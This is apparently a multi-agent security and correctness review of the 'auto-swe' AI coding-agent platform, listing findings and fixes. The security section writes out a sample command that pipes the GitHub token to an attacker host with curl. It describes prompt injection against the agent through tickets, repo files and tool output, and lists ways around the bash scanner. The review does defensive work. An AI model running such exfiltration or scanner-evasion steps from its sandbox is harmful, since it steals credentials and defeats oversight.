# auto-swe — Whole-Repository Code Review (2026-07-15)

> Point-in-time multi-agent review at commit `4e11c7a`. Findings are grouped by
> dimension and ranked by severity within each. Every HIGH-severity item below
> was independently verified against the source (file:line cited). This document
> is a snapshot, not a live tracker — treat the code as authoritative where it
> has since diverged. Companion to the earlier `docs/REPO_REVIEW.md` (2026-06-09).

## Method

Six parallel reviews swept the codebase across security/auth, worker & Temporal
correctness, gateway API & data integrity, the Prisma data model, the Next.js
frontend, and testing/build/tooling. The security pass further decomposed into
worker-side and gateway-side sub-reviews. Load-bearing findings were then
re-read and confirmed directly.

## Headline assessment

The codebase is **mature and security-conscious**. `yarn typecheck` and
`yarn lint` (Biome, 618 files) both pass clean. The cryptographic envelope
(AES-256-GCM), webhook HMAC verification (`timingSafeEqual` + length guards +
Slack replay window), PAT hashing, host-side shell escaping, pgvector
parameterization, the declarative RBAC hook, and the org-billing idempotency
guard are all correctly implemented and were verified as such. No auth bypass,
no host RCE, and no broken crypto were found.

The issues worth acting on cluster in three places: (1) the **agent's own
sandbox is the weakest-isolated container in the system** while carrying the
most dangerous payload; (2) several **check-then-act races** in the gateway
(run cancel, org budget, repo onboarding); and (3) **multi-tenant isolation is
under-enforced at the schema layer** — exactly the area CLAUDE.md already flags
as application-layer-only.

---

## 1. Security & Auth

### HIGH — The agent workspace container has no isolation hardening
`packages/worker/src/activities/workspace.ts:68`

The container that executes arbitrary, potentially prompt-injected LLM output
via the `bash` tool is launched with only `--dns` flags:
```
docker run -d --name workspace-<hex> --dns=1.1.1.1 --dns=8.8.8.8 -- <image> sleep infinity
```
No `--network` restriction, no `--memory`/`--cpus`/`--pids-limit`, no
`--cap-drop`, no `--security-opt=no-new-privileges`, no `--read-only`; it runs
as root. By contrast `packages/worker/src/lib/ephemeralContainer.ts:122-130`
— used for **lower-risk, team-admin-authored** shell/container steps — applies
`--network=none`, memory/cpu/pids caps, `--read-only`, `--cap-drop=ALL`, and
`--security-opt=no-new-privileges`. The isolation posture is inverted: trusted
authored commands are locked down, untrusted agent code is not.
*Mitigating:* the Docker socket is **not** mounted into the workspace, so there
is no daemon-level escape.
**Fix:** apply the `ephemeralContainer` lockdown to `createWorkspace` — at
minimum resource caps, `--cap-drop=ALL`, `--security-opt=no-new-privileges`,
and a default-deny/allowlisted egress posture that blocks `169.254.169.254`.

### HIGH — GitHub token is exfiltratable from the workspace
`packages/worker/src/lib/scm/github.ts:33`, `packages/worker/src/activities/workspace.ts`

The repo is cloned with a credential-embedded URL
(`https://x-access-token:<token>@github.com/...`); git persists it verbatim in
`/workspace/target-repo/.git/config` for the whole agent session, and it is
never scrubbed. Combined with the unrestricted egress above, any bash command
the agent is induced to run can read and post the token out
(`git config --get remote.origin.url | curl -d @- https://attacker/`). A prompt
injection reaching the implementer (via ticket text, repo files, MCP tool
output, CI logs) yields credential theft; in a classic-PAT deployment that
token is typically org-wide with repo-write scope. The `bash` scanner is a
**soft block** (advisory string to the model) and is trivially evadable
(`wget`, `node -e`, DNS exfil, base64 chunking).
**Fix:** never persist the token in the workspace — clone with an ephemeral
credential helper or `git remote set-url origin <clean-url>` immediately after
clone, injecting credentials only for the host-side push activity. Prefer a
short-lived GitHub App installation token over a broad PAT.

### MEDIUM — Jira webhook skips signature verification when no secret is set
`packages/gateway/src/routes/webhooks.ts:557-570` (registered `skipAuth: true`)

The HMAC check is inside `if (config.webhookSecret) { … }`. With no tracker
`webhookSecret` configured (the default), the branch is skipped and the handler
creates a `RunInput` work-request from a fully unauthenticated, attacker-
controlled body — a cost/DoS and content-injection vector (attacker text
becomes an agent task description). This diverges from `/git` and `/ci`, which
hard-fail 401 on a missing secret (`verifyWebhookOrReject`).
**Fix:** fail closed — reject with 401 when `webhookSecret` is unset.

### MEDIUM — Account pre-hijacking via unverified email + trusted-provider linking
`packages/gateway/src/lib/betterAuth.ts:320-321, 381`

`accountLinking.enabled: true` with `trustedProviders: ['github','google',
'email-password']` **and** `requireEmailVerification: false`. An attacker can
register email/password for `victim@company.com` (never verified) before the
victim onboards; when the victim later signs in via a verified OAuth provider
at the same address, better-auth links both onto one User row, leaving the
attacker's password credential attached to the victim's account.
**Fix:** set `requireEmailVerification: true`, and/or drop `email-password`
from `trustedProviders`.

### MEDIUM — SSRF protection is applied inconsistently
`packages/gateway/src/lib/credentialService.ts` (strong guard) vs. the consumers below

The well-tested `isSafeProbeUrl` (loopback, RFC1918, link-local, IPv6 ULA,
IPv4-mapped IPv6, `.local`/`.internal`) guards **only** `POST /credentials/:id/test`.
Every other server-side fetch of an operator-supplied URL uses a weaker guard
or none:
- **MCP connection URLs** — scheme-only validation (`mcpConnections.ts:16-20`),
  then the worker connects (`resolveAgentMcpUrl` → `loadMcpTools`).
- **Provider-credential `apiBase`** — not validated at write time; reachable by
  a **team owner**, not just platform admins.
- **`bundleFetch`** — `assertPublicBundleUrl(url)` checks the *initial* URL then
  `fetch(url)` follows redirects with no re-check, so a `302 → 169.254.169.254`
  reaches cloud metadata (`bundleFetch.ts:55-69`). Its `isBlockedHost` subset
  also misses `[::ffff:127.0.0.1]`, `127.1`, `10.1`.
- **Tracker / knowledge-base / Figma base URLs** — fetched at submit time, no
  address check.
**Fix:** export `isSafeProbeUrl` to `@auto-swe/shared` and reuse it in every
URL-fetch path (validate each redirect hop for `bundleFetch`).

### LOW — Secondary controls that read as protective but aren't
- The `bash` scanner loads only `SHELL_COMMAND` patterns; the curl/wget/nc/
  metadata/`/etc/passwd` rules are typed `EXFILTRATION` and are never applied to
  bash (`lib/shellCommandScanner.ts`, `scannerPatterns/index.ts`).
- `checkSensitiveFilePath` + `preWriteSecurityCheck` gate only the `writeFile`
  tool; with `bash` enabled (the default), `echo … > .env` bypasses both.
- Session cache serves up to 60 s of stale role/`isActive` after a change on the
  cookie path (`plugins/auth.ts`); sign-out invalidates, deactivation/demotion
  does not.

---

## 2. Gateway — API Correctness & Data Integrity

### HIGH — Run cancel clobbers a completed run's status and can suppress billing
`packages/gateway/src/routes/workflowRuns.ts:148-167`

Check-then-act with no concurrency guard: `findFirst` asserts
`status === 'RUNNING'`, then `update where: { id }` writes `CANCELLED` with **no
status predicate**. If the worker's `finalizeWorkflowRun` interleaves, either
the cancel clobbers a just-written `SUCCESS`, or (reverse order) cancel sets
`endedAt` first and `finalizeWorkflowRun`'s pre-read `endedAt` guard then skips
org billing entirely — a completed run never billed against the budget cap.
**Fix:** `updateMany({ where: { id, status: 'RUNNING' }, … })` and treat
`count === 0` as already-terminal (409/no-op).

### MEDIUM — Jira webhook creates orphan `RunInput` rows that never execute
`packages/gateway/src/routes/webhooks.ts:549-627`

The handler writes `runInput.create(...)` and returns `200 ok`, but never starts
a Temporal workflow or creates an `ActiveWorkflow`, and there is no worker
poller consuming bare `RunInput` rows — so these auto-created requests are dead
on arrival. No dedup either: repeated transitions/redeliveries insert duplicates
(and when unsigned, anyone can flood the table).
**Fix:** start the workflow like other paths, or add the consumer; add a dedup
key and require the signature.

### MEDIUM — Org budget cap is non-atomic, and epics bypass it entirely
`packages/gateway/src/routes/workRequests.ts:449-464`, `packages/gateway/src/routes/epics.ts:61-146`

The budget check reads `OrgMonthlyUsage.costUsdAccrued` then accrues cost much
later in the worker, so concurrent submissions all pass the same pre-spend read.
More significantly, `POST /epics` — the highest-cost entry point (fans out to
many child workflows) — performs **no budget check and no `assertOrgAccess`**,
validating only per-repo team membership.
**Fix:** add `assertOrgAccess` + the budget check to the epic route; make the
cap an atomic conditional increment/reservation (or document it as soft).

### MEDIUM — `/webhooks/ci` is not idempotent
`packages/gateway/src/routes/webhooks.ts:328-439`

GitHub redelivers webhooks and sends multiple `check_run` events per SHA. Unlike
`/git` (idempotent via the `status: 'OPEN'` filter), the CI handler re-queries
open PRs by `headSha`, re-updates `ciStatus`, and **re-fires `ciPipelineSignal`**
on every delivery — a duplicate "failed" can push the CI-fix loop a second time.
Additionally, `aggregateCheckRuns` (`lib/github.ts`) caps at `per_page=100` with
no pagination, so a commit with >100 checks can compute "passed" over a subset
while a truncated failing check exists.
**Fix:** record the last processed `(prId, headSha, conclusion)` and
short-circuit repeats; paginate check runs (or fall back to per-run signaling).

### MEDIUM — `/lessons/stats` loads every `MemoryItem` into the gateway
`packages/gateway/src/routes/lessons.ts:154-184`

`connection.findMany` with `memoryItems: { select: { consolidatedAt: true } }`
and no `take`, then counts in JS — pulls the entire `memory_items` table on each
call and will OOM as memory accumulates.
**Fix:** `prisma.memoryItem.groupBy({ by: ['repoId'], _count, _max })`.

### LOW/MEDIUM — Unbounded list endpoints & non-transactional toggles
- Unpageable/unbounded lists: `GET /repositories` (`repositories.ts:104-129`),
  `GET /lessons` (hardcoded `take: 100`, no offset/total), `GET /epics`
  (`take: 500` then JS slice; `meta.total` under-reports past 500).
- Duplicate repo onboarding is check-then-act; the `P2002` isn't caught, so the
  client gets a generic **500 instead of 409** — `isUniqueConstraintError`
  already exists but is unused (`repositories.ts:168-192`).
- `isDefault` template toggle runs the sibling-clear and the set in separate
  writes, not a `$transaction` — a failure between them leaves zero defaults
  (`workflowTemplates.ts:903-910`).

**Verified correct:** `securityEvents` pagination (DB-level predicates),
`workflowRuns`/`workRequests` bounded lists, the `/git` merge path idempotency,
`createTemplateVersion`'s racy-`max(version)+1` retry loop, and the global error
handler's 5xx suppression.

---

## 3. Worker & Temporal Correctness

### MEDIUM — `finalizeWorkflowRun` double-counts channel budget and re-notifies on retry
`packages/worker/src/activities/templates.ts:259-289`

The org-billing increment is correctly guarded by `!alreadyFinalized`, but the
non-idempotent side effects **after** the transaction are not:
`notifySlackRunComplete` (259), `finalizeChannelTaskRun` → `accrueChannelUsage`
(270, a Prisma `{ increment }` upsert), and `syncTrackerOnEvent` (279). The
activity has a 30 s timeout and 5 retries; if the post-transaction network calls
exceed the timeout or the unwrapped `activeWorkflow.updateMany` (245) throws,
Temporal retries the whole activity. On retry org billing is skipped, but the
channel ledger increments again (channels hit their cap early) and the Slack
completion message / tracker comment re-fire.
**Fix:** gate `accrueChannelUsage` (at minimum) and the notifications on
`!alreadyFinalized`, the same guard already protecting org billing.

### LOW — Interpreter double-records a FAILED step for retry-backed nodes
`packages/shared/src/workflow/interpreter.ts:358-368`

The `walk` catch suppresses its own FAILED recording only for `'step'` and
`'shell'`. But `agent`, `mcp`, `eval`, and `containerStep` route through
`runRetryable`, which already records FAILED on terminal throw (`:729-734`) — so
those node types get a duplicate FAILED `workflow_steps` row in the run viewer.
Observability-only.
**Fix:** exclude all `runRetryable`-backed types from the `walk` catch record.

### LOW — Confusing dead `if (attempt < maxAttempts) {}` in `runRetryable`
`packages/shared/src/workflow/interpreter.ts:735-736` — retries work via the
enclosing loop; the empty block reads as missing logic. Delete or comment it.

**Verified correct (CLAUDE.md claims held up):** the org-billing atomicity guard
(`templates.ts:196-236`), embedding 1536-dim enforcement, `persistActivityTrace`
in `finally` across all 16 LLM activities, workspace `destroy()` in `finally`
across every caller, no determinism violations in isolate code (patched
`Date.now`, pure shared imports, deterministic fanOut pool), and idempotent
`createWorkflowRun` upsert.

---

## 4. Data Model (Prisma schema & migrations)

### HIGH — `Agent` has no scope/discriminator CHECK constraint
`schema.prisma` model `Agent`; `migrations/…0001/migration.sql` (agent partial
uniques only). Unlike `ProviderCredential`, which gets a
`scope_keys_check` binding each scope to the right discriminator, `Agent` gets
only partial unique indexes. Two consequences: (a) the
`WHERE scope='TEAM'` partial unique doesn't enforce uniqueness when
`team_id IS NULL` (Postgres NULL-distinct), so duplicate `(key, version)` TEAM
rows are insertable; (b) nothing stops a `GLOBAL` row carrying a `team_id` and
leaking into a tenant's resolver cascade. `resolveAgent` ("highest active
version at a scope") then becomes nondeterministic or cross-tenant.
**Fix:** add a CHECK mirroring `provider_credentials_scope_keys_check`.

### HIGH — `MemoryItem.teamId`/`orgId` are bare UUIDs with no FK/cascade
`schema.prisma:145-146`. These denormalized keys drive the channel-assistant
cross-tenant memory search (`searchOrgChannelMemory`/`searchTeamChannelMemory`),
yet have no referential integrity and no cleanup — deleting a Team/Org orphans
the rows, whose now-dangling `org_id`/`team_id` keep matching org-wide searches
and surface a defunct tenant's private facts. (`channelId` **does** have an FK;
`teamId`/`orgId` don't.)
**Fix:** add real FKs with `ON DELETE CASCADE` (or `SET NULL` + scrub).

### HIGH — `Skill` carries no tenant column
`schema.prisma` model `Skill`. Isolation is expressed only via which agents
reference a skill (`AgentSkillRef`), not on the row. A custom
(`isVerified:false`) skill authored by one team is a global row any other
team's agent can attach, and its `promptText` is readable platform-wide.
**Fix:** add `scope`/`teamId`/`orgId` (mirroring `EvalRubric`), or explicitly
document that all non-built-in skills are intentionally global and gate creation
to admins.

### MEDIUM — Three singleton config tables lack the `id = 'default'` CHECK
`migrations/…0001` adds the singleton CHECK for six config tables but **not**
`issue_tracker_config`, `knowledge_base_config`, or `figma_config` (the
migration comment documents the `tracker_config` drop). CLAUDE.md asserts all
eight are CHECK-guarded; three are not. The `@default("default")` protects the
Prisma path but not raw inserts / `findFirst`.
**Fix:** add `CHECK (id = 'default')` to the three.

### MEDIUM — FK columns without covering indexes; `run_inputs` has none
`connections.team_id` (RESTRICT), `run_inputs.*` (zero non-PK indexes —
including the `NOT NULL` `external_ticket_id` that work requests are looked up
by), `scheduled_work_requests.*`, `memory_items.workflow_id/workflow_run_id`,
and several scope discriminators indexed only scope-leftmost. Tenant-delete
integrity checks and list queries seq-scan and take row locks at scale.
**Fix:** add single-column FK indexes (or reorder composites discriminator-first).

### MEDIUM — Other integrity gaps
- `NOT NULL` array reinstatement is incomplete: only 3 of 7 `TEXT[]` columns were
  fixed (`context_snapshots.success_criteria`, `teams.shell_image_allowlist`,
  `eval_cases.tags`, `knowledge_base_config.spaces` remain DB-nullable while the
  client types them non-null).
- `PullRequest` has no `@@unique([repoId, prNumber])` — duplicate PR rows can
  confuse the CI self-healing loop's "current PR" lookup.
- Per-run token counters are `Int` (`WorkflowRun`/`ActiveWorkflow`) while the
  monthly aggregate they feed is `BigInt`; a very large run can overflow Int32.
  Cost is `Float` per-run vs `Decimal(12,6)` in the billing aggregate.

**Verified correct:** the billing `@@unique([orgId, yearMonth])` /
`([channelId, yearMonth])` backing the race-safe increment upserts, the pgvector
`vector(1536)` + HNSW modeling kept out of the Prisma DSL, the clean `AgentRole`
enum removal, and the RESTRICT-protected tenant roots.

---

## 5. Web Frontend (Next.js)

### HIGH — Repo selection silently reverts, causing wrong-repo submission
`packages/web/src/components/dashboard/SubmitWorkRequestModal.tsx:30,52-57`

`repos = allRepos.filter(...)` is recomputed in the render body (new array
identity every render), and the seeding effect depends on `repos`, so it re-runs
after every commit and forces `repoId` back to `defaultRepoId ?? repos[0].id`.
A user who picks a non-default repo has the selection immediately reset — and if
they don't notice, the work request dispatches against the wrong repository,
which the agent then clones and modifies. Safety bug, not just UX.
**Fix:** memoize `repos` and seed once on the `open` edge with a
`setRepoId(cur => cur || defaultRepoId || repos[0]?.id || '')` guard.

### MEDIUM — Bearer JWT persisted in `localStorage` and a non-HttpOnly cookie
`packages/web/src/lib/api.ts:22-31`

The access token is stored in `localStorage` and mirrored into a JS-readable
cookie — a redundant, weaker-stored secondary credential (the primary path is
the HttpOnly better-auth session cookie). Any future XSS / compromised dependency
/ malicious extension can read and exfiltrate full gateway access. No active XSS
sink was found, so this is defense-in-depth.
**Fix:** rely on the session cookie; if the JWT bridge must stay, keep it in
memory only and stop mirroring it into a JS-readable cookie.

### LOW — DAG viewer rebuilds all React Flow nodes every 3 s poll; a11y gaps
`packages/web/src/components/workflow/WorkflowDag.tsx:63-77,145-153` — the node
array is rebuilt on each `useWorkflowRun` refetch (redundant work; would clobber
node-level UI state if added later), and nodes expose no `role`/`aria-label`/
status to screen readers under a `role="application"` container.

**Verified clean:** XSS is well-controlled (the sole `dangerouslySetInnerHTML`
injects JSON-escaped operator env vars; all agent/user content renders as React
text or `react-markdown` without `rehype-raw`); no sensitive `NEXT_PUBLIC_`
leakage; open-redirect guarded on `?redirect=`; TanStack Query invalidation and
polling back-off are sound.

---

## 6. Testing, Build & Tooling

- `yarn typecheck` **PASS**, `yarn lint` (Biome) **PASS** (618 files, no
  warnings). 130 `.test.ts` files, none assertion-free. Security scanners,
  billing/budget, RBAC hooks, and behavioral Temporal determinism are all
  covered with meaningful assertions. CI (`ci.yml`) runs typecheck + lint +
  coverage + build plus a real-migration/seed idempotency job.

### HIGH — Vulnerable `nodemailer` 8.0.10
`packages/gateway/package.json:34` — GHSA-p6gq-j5cr-w38f (the message-level `raw`
option bypasses `disableFileAccess`/`disableUrlAccess` → arbitrary file read +
SSRF; affects `<=9.0.0`). The CI audit runs with `|| true` so it never fails the
build. **Fix:** upgrade to `>9.0.0` and gate CI on the audit.

### HIGH — The `shellQuote` injection primitive is untested, and a mock drops escaping
`packages/worker/src/activities/workspace.ts:19` wraps every `docker exec … sh -c`
and clone/checkout arg, yet there is **no `workspace.test.ts`**. Worse,
`decomposition.test.ts:61` mocks it as `` `'${s}'` `` — no single-quote escaping
— so a real regression in the primitive (or a caller dropping it) passes CI
green. **Fix:** add a dedicated test asserting escaping against `'`, `$(…)`,
backticks, `;`/`&&`, and newlines; make the mock faithful.

### MEDIUM — Coverage measured but not enforced; no Temporal Replayer test
`vitest.config.ts` configures v8 coverage with no `thresholds`, so coverage can
silently regress. Determinism is covered only behaviorally — there is no
`Replayer`-based history-replay test, the actual guard against the V8-isolate
non-determinism failure mode. **Fix:** add coverage floors (at least on the
security/billing paths) and a recorded-history `Replayer` test.

### LOW — Flake risk & drift
`cache.test.ts` sleeps 25–30 ms against a 10 ms TTL (tight under parallel CI);
channel-activity tests are heavily mocked (orchestration-only); `packageManager`
pins `yarn@4.17.0` while the docs say 4.16.0.

---

## Priority shortlist

If only a handful are actioned, do these first (highest risk-reduction per unit
effort):

1. **Harden the agent workspace container** + stop persisting the GitHub token
   in it (§1 HIGH ×2) — the largest blast-radius issue.
2. **Guarded run-cancel write** and **gate channel-billing/notifications on
   `!alreadyFinalized`** (§2 HIGH, §3 MEDIUM) — data-integrity races.
3. **Add the `Agent` scope CHECK** and **FK the `MemoryItem` tenant columns**
   (§4 HIGH ×2) — multi-tenant isolation.
4. **Fix the repo-selection revert** (§5 HIGH) — wrong-repo submission.
5. **Upgrade nodemailer** and **test `shellQuote`** (§6 HIGH ×2) — cheap.
6. **Fail closed on the unsigned Jira webhook** and **reuse `isSafeProbeUrl`
   everywhere** (§1 MEDIUM ×2).
